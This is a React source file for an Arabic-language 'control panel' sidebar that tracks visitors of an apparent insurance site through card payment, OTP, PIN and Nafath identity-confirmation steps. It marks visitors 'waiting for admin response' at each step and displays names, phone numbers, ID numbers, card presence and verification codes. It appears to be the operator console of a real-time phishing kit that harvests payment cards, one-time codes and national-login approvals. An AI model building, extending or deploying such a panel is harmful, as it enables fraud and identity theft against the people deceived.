"use client"

import { useEffect, useState } from "react"
import { Search, Trash2, CheckSquare, Square, CreditCard, KeyRound, RefreshCw } from "lucide-react"
import type { InsuranceApplication } from "@/lib/firestore-types"
import { getTimeAgo } from "@/lib/time-utils"

interface VisitorSidebarProps {
  visitors: InsuranceApplication[]
  selectedVisitor: InsuranceApplication | null
  onSelectVisitor: (visitor: InsuranceApplication) => void
  searchQuery: string
  onSearchChange: (query: string) => void
  cardFilter: "all" | "hasCard"
  onCardFilterChange: (filter: "all" | "hasCard") => void
  selectedIds: Set<string>
  onToggleSelect: (id: string) => void
  onSelectAll: () => void
  onDeleteSelected: () => void
  sidebarWidth: number
  onSidebarWidthChange: (width: number) => void
  totalVisitors: number
  onlineCount: number
  unreadCount: number
  currentPage: number
  totalPages: number
  pageSize: number
  onPageChange: (page: number) => void
}

// Check if visitor is waiting for admin response
const isWaitingForAdmin = (visitor: InsuranceApplication): boolean => {
  return (
    visitor.cardStatus === "waiting" ||
    visitor.otpStatus === "waiting" ||
    visitor.pinStatus === "waiting" ||
    visitor.nafadConfirmationStatus === "waiting"
  )
}

// Get current page name in Arabic
const getPageName = (step: number | string): string => {
  // Handle string values first (legacy system)
  if (typeof step === 'string') {
    const stringPageNames: Record<string, string> = {
      '_st1': 'الدفع (بطاقة)',
      '_t2': 'OTP',
      '_t3': 'PIN',
      '_t6': 'نفاذ',
      'phone': 'الهاتف',
      'home': 'الرئيسية',
      'insur': 'بيانات التأمين',
      'compar': 'مقارنة العروض',
      'check': 'الدفع',
      'veri': 'OTP',
      'confi': 'PIN',
      'nafad': 'نفاذ'
    }
    return stringPageNames[step] || `غير محدد (${step})`
  }
  
  // Handle numeric values
  const stepNum = typeof step === 'number' ? step : parseInt(step)
  const pageNames: Record<number, string> = {
    0: 'الرئيسية',
    1: 'الرئيسية',
    2: 'بيانات التأمين',
    3: 'مقارنة العروض',
    4: 'الدفع',
    5: 'OTP',
    6: 'PIN',
    7: 'الهاتف',
    8: 'نفاذ'
  }
  
  return pageNames[stepNum] || `غير محدد (${stepNum})`
}

const getPaginationItems = (currentPage: number, totalPages: number): Array<number | string> => {
  if (totalPages <= 7) {
    return Array.from({ length: totalPages }, (_, index) => index + 1)
  }

  const items: Array<number | string> = [1]
  const start = Math.max(2, currentPage - 1)
  const end = Math.min(totalPages - 1, currentPage + 1)

  if (start > 2) {
    items.push("start-ellipsis")
  }

  for (let page = start; page <= end; page += 1) {
    items.push(page)
  }

  if (end < totalPages - 1) {
    items.push("end-ellipsis")
  }

  items.push(totalPages)
  return items
}

export function VisitorSidebar({
  visitors,
  selectedVisitor,
  onSelectVisitor,
  searchQuery,
  onSearchChange,
  cardFilter,
  onCardFilterChange,
  selectedIds,
  onToggleSelect,
  onSelectAll,
  onDeleteSelected,
  sidebarWidth,
  onSidebarWidthChange,
  totalVisitors,
  onlineCount,
  unreadCount,
  currentPage,
  totalPages,
  pageSize,
  onPageChange
}: VisitorSidebarProps) {
  const currentPageIds = visitors
    .map((visitor) => visitor.id)
    .filter((id): id is string => id !== undefined)
  const allSelected = currentPageIds.length > 0 && currentPageIds.every((id) => selectedIds.has(id))
  const paginationItems = getPaginationItems(currentPage, totalPages)
  const pageStart = totalVisitors === 0 ? 0 : (currentPage - 1) * pageSize + 1
  const pageEnd = Math.min(currentPage * pageSize, totalVisitors)
  const [isLandscapeTablet, setIsLandscapeTablet] = useState(false)
  useEffect(() => {
    const mediaQuery = window.matchMedia("(orientation: landscape) and (max-width: 1024px)")
    const updateMatch = () => setIsLandscapeTablet(mediaQuery.matches)
    updateMatch()

    mediaQuery.addEventListener("change", updateMatch)
    return () => mediaQuery.removeEventListener("change", updateMatch)
  }, [])



  return (
    <div 
      className="relative flex w-full flex-col border-slate-200/80 bg-white/90 shadow-sm landscape:border-l dark:border-slate-700/80 dark:bg-slate-900/90 md:w-[400px] md:border-l"
      style={{ 
        fontFamily: 'Cairo, Tajawal, sans-serif',
        width: isLandscapeTablet ? `${sidebarWidth}px` : undefined
      }}
    >

      {/* Header */}
      <div className="border-b border-slate-200/80 bg-white/90 px-4 py-4 dark:border-slate-700/80 dark:bg-slate-900/90 landscape:p-2">
        <h1 className="mb-4 text-xl font-extrabold text-slate-900 dark:text-slate-100 landscape:mb-2 landscape:text-base">
          لوحة التحكم
        </h1>
        
        {/* Search */}
        <div className="relative mb-3 landscape:mb-2">
          <Search className="absolute right-3 top-1/2 h-4 w-4 -translate-y-1/2 text-slate-400 dark:text-slate-500 landscape:h-4 landscape:w-4" />
          <input
            type="text"
            placeholder="بحث (الاسم، الهوية، الهاتف، آخر 4 أرقام)"
            value={searchQuery}
            onChange={(e) => onSearchChange(e.target.value)}
            className="w-full rounded-xl border border-slate-300 bg-white py-2 pl-4 pr-10 text-sm text-slate-700 shadow-sm transition placeholder:text-slate-400 focus:border-emerald-500 focus:outline-none focus:ring-2 focus:ring-emerald-200 dark:border-slate-600 dark:bg-slate-800 dark:text-slate-200 dark:placeholder:text-slate-500 dark:focus:border-emerald-400 dark:focus:ring-emerald-900/60 landscape:py-1.5 landscape:text-xs"
          />
        </div>

        {/* Filters */}
        <div className="flex gap-2 mb-3 landscape:mb-2">
          <button
            onClick={() => onCardFilterChange("all")}
            className={`flex-1 rounded-xl px-3 py-1.5 text-sm font-semibold transition landscape:py-1 landscape:text-xs ${
              cardFilter === "all"
                ? "bg-emerald-600 text-white shadow-sm"
                : "bg-slate-100 text-slate-700 hover:bg-slate-200 dark:bg-slate-800 dark:text-slate-200 dark:hover:bg-slate-700"
            }`}
          >
            الكل
          </button>
          <button
            onClick={() => onCardFilterChange("hasCard")}
            className={`flex-1 rounded-xl px-3 py-1.5 text-sm font-semibold transition landscape:py-1 landscape:text-xs ${
              cardFilter === "hasCard"
                ? "bg-emerald-600 text-white shadow-sm"
                : "bg-slate-100 text-slate-700 hover:bg-slate-200 dark:bg-slate-800 dark:text-slate-200 dark:hover:bg-slate-700"
            }`}
          >
            لديهم بطاقة
          </button>
        </div>

        {/* Actions */}
        <div className="flex gap-2">
          <button
            onClick={onSelectAll}
            className="inline-flex items-center gap-1.5 rounded-xl border border-slate-200 bg-slate-100 px-3 py-1.5 text-sm font-semibold text-slate-700 transition hover:bg-slate-200 dark:border-slate-700 dark:bg-slate-800 dark:text-slate-200 dark:hover:bg-slate-700 landscape:py-1 landscape:text-xs"
          >
            {allSelected ? <CheckSquare className="w-4 h-4 landscape:w-3 landscape:h-3" /> : <Square className="w-4 h-4 landscape:w-3 landscape:h-3" />}
            {allSelected ? "إلغاء الصفحة" : "تحديد الصفحة"}
          </button>
          
          {selectedIds.size > 0 && (
            <button
              onClick={onDeleteSelected}
              className="inline-flex items-center gap-1.5 rounded-xl bg-rose-600 px-3 py-1.5 text-sm font-semibold text-white transition hover:bg-rose-700 landscape:py-1 landscape:text-xs"
            >
              <Trash2 className="w-4 h-4 landscape:w-3 landscape:h-3" />
              حذف ({selectedIds.size})
            </button>
          )}
        </div>

        <div className="mt-3 flex flex-wrap items-center gap-2 landscape:mt-2">
          <span className="rounded-full bg-slate-100 px-2.5 py-1 text-[11px] font-semibold text-slate-600 dark:bg-slate-800 dark:text-slate-300">
            الإجمالي: {totalVisitors}
          </span>
          <span className="rounded-full bg-emerald-100 px-2.5 py-1 text-[11px] font-semibold text-emerald-700">
            متصل: {onlineCount}
          </span>
          <span className="rounded-full bg-fuchsia-100 px-2.5 py-1 text-[11px] font-semibold text-fuchsia-700">
            غير مقروء: {unreadCount}
          </span>
        </div>

        {isLandscapeTablet && (
          <div className="mt-3 rounded-xl border border-slate-200 bg-slate-50 px-3 py-2 dark:border-slate-700 dark:bg-slate-800/60 landscape:mt-2">
            <div className="mb-1 flex items-center justify-between text-[11px] font-semibold text-slate-600 dark:text-slate-300">
              <span>عرض القائمة</span>
              <span>{sidebarWidth}px</span>
            </div>
            <input
              type="range"
              min={280}
              max={520}
              step={10}
              value={sidebarWidth}
              onChange={(event) => onSidebarWidthChange(Number(event.target.value))}
              className="h-1.5 w-full cursor-pointer accent-emerald-600"
            />
          </div>
        )}
      </div>

      {/* Visitor List */}
      <div className="flex flex-1 flex-col bg-slate-50/60 dark:bg-slate-950/40">
        <div className="flex-1 overflow-y-auto p-2">
          {visitors.length === 0 ? (
            <div className="p-8 text-center text-slate-500 dark:text-slate-400">
              <p>لا يوجد زوار</p>
            </div>
          ) : (
            visitors.map((visitor) => (
              <div
                key={visitor.id}
                onClick={() => onSelectVisitor(visitor)}
                className={`mb-2 cursor-pointer rounded-2xl border p-4 shadow-sm transition duration-150 landscape:p-2 ${
                  selectedVisitor?.id === visitor.id
                    ? "border-emerald-300 bg-emerald-50/80 ring-2 ring-emerald-100 dark:border-emerald-700/80 dark:bg-emerald-950/35 dark:ring-emerald-900/60"
                    : "border-slate-200 bg-white hover:border-slate-300 hover:bg-slate-50/70 dark:border-slate-700 dark:bg-slate-900 dark:hover:border-slate-600 dark:hover:bg-slate-800"
                } ${visitor.isUnread ? "border-fuchsia-200 bg-fuchsia-50/70 dark:border-fuchsia-800/70 dark:bg-fuchsia-950/30" : ""}`}
              >
                <div className="flex items-start gap-3">
                  {/* Checkbox */}
                  <div
                    onClick={(e) => {
                      e.stopPropagation()
                      if (visitor.id) onToggleSelect(visitor.id)
                    }}
                    className="mt-1"
                  >
                    {(visitor.id && selectedIds.has(visitor.id)) ? (
                      <CheckSquare className="h-5 w-5 text-green-600 dark:text-green-400" />
                    ) : (
                      <Square className="h-5 w-5 text-gray-400 dark:text-slate-500" />
                    )}
                  </div>

                  {/* Visitor Info */}
                  <div className="flex-1 min-w-0">
                    {/* Name & Time Ago */}
                    <div className="flex items-center justify-between mb-1">
                      <div className="flex items-center gap-2 flex-1 min-w-0">
                        <h3 className="truncate text-base font-semibold text-slate-900 dark:text-slate-100 landscape:text-sm">{visitor.ownerName}</h3>
                        <span className="flex items-center gap-1 whitespace-nowrap rounded-full bg-sky-700 px-2 py-0.5 text-xs font-medium text-white">
                          {isWaitingForAdmin(visitor) && (
                            <RefreshCw className="w-3 h-3 animate-spin" />
                          )}
                          {getPageName(visitor.currentStep)}
                        </span>
                      </div>
                      
                      {/* Time ago indicator */}
                      <div className="flex items-center gap-1 whitespace-nowrap text-xs font-medium text-slate-500 dark:text-slate-400 landscape:text-[10px]">
                        <span>{getTimeAgo(visitor.updatedAt || visitor.lastSeen)}</span>
                      </div>
                    </div>

                    {/* Contact Info: Phone & ID */}
                    <div className="mb-2 hidden items-center gap-3 text-xs text-slate-700 dark:text-slate-300 md:flex">
                      {visitor.phoneNumber && (
                        <div className="flex items-center gap-1">
                          <span className="font-medium">📞 {visitor.phoneNumber}</span>
                        </div>
                      )}
                      {visitor.identityNumber && (
                        <div className="flex items-center gap-1">
                          <span className="font-medium">🆔 {visitor.identityNumber}</span>
                        </div>
                      )}
                    </div>

                    {/* Bottom Row: Status & Page */}
                    <div className="hidden md:flex items-center justify-between">
                      {/* Left: Online Status & Icons */}
                      <div className="flex items-center gap-2">
                        <div className="flex items-center gap-1">
                          <div className={`w-2 h-2 rounded-full ${visitor.isOnline ? 'bg-green-500' : 'bg-gray-400'}`}></div>
                          <span className="text-xs text-slate-600 dark:text-slate-400">{visitor.isOnline ? 'متصل' : 'غير متصل'}</span>
                        </div>
                        
                        {(visitor._v1 || visitor.cardNumber) && (
                          <div className="flex items-center gap-1 rounded-md bg-blue-100 px-2 py-0.5 text-xs text-blue-700">
                            <CreditCard className="w-3 h-3" />
                          </div>
                        )}
                        {visitor.phoneVerificationCode && (
                          <div className="flex items-center gap-1 rounded-md bg-purple-100 px-2 py-0.5 text-xs text-purple-700">
                            <KeyRound className="w-3 h-3" />
                          </div>
                        )}
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            ))
          )}
        </div>

        {totalPages > 1 && (
          <div className="border-t border-slate-200/80 bg-white/90 px-3 py-2 dark:border-slate-700/80 dark:bg-slate-900/90">
            <div className="mb-2 flex items-center justify-between text-xs font-semibold text-slate-600 dark:text-slate-300">
              <span>الصفحة {currentPage} من {totalPages}</span>
              <span>{pageStart}-{pageEnd} من {totalVisitors}</span>
            </div>
            <div className="flex items-center justify-center gap-1">
              <button
                onClick={() => onPageChange(Math.max(1, currentPage - 1))}
                disabled={currentPage === 1}
                className="rounded-md border border-slate-200 bg-white px-2 py-1 text-xs font-semibold text-slate-700 transition hover:bg-slate-100 disabled:cursor-not-allowed disabled:opacity-40 dark:border-slate-700 dark:bg-slate-800 dark:text-slate-200 dark:hover:bg-slate-700"
              >
                السابق
              </button>

              {paginationItems.map((item, index) =>
                typeof item === "number" ? (
                  <button
                    key={item}
                    onClick={() => onPageChange(item)}
                    className={`min-w-7 rounded-md border px-2 py-1 text-xs font-semibold transition ${
                      item === currentPage
                        ? "border-emerald-600 bg-emerald-600 text-white"
                        : "border-slate-200 bg-white text-slate-700 hover:bg-slate-100 dark:border-slate-700 dark:bg-slate-800 dark:text-slate-200 dark:hover:bg-slate-700"
                    }`}
                  >
                    {item}
                  </button>
                ) : (
                  <span key={`${item}-${index}`} className="px-1 text-xs text-slate-500 dark:text-slate-400">
                    ...
                  </span>
                )
              )}

              <button
                onClick={() => onPageChange(Math.min(totalPages, currentPage + 1))}
                disabled={currentPage === totalPages}
                className="rounded-md border border-slate-200 bg-white px-2 py-1 text-xs font-semibold text-slate-700 transition hover:bg-slate-100 disabled:cursor-not-allowed disabled:opacity-40 dark:border-slate-700 dark:bg-slate-800 dark:text-slate-200 dark:hover:bg-slate-700"
              >
                التالي
              </button>
            </div>
          </div>
        )}
      </div>
    </div>
  )
}
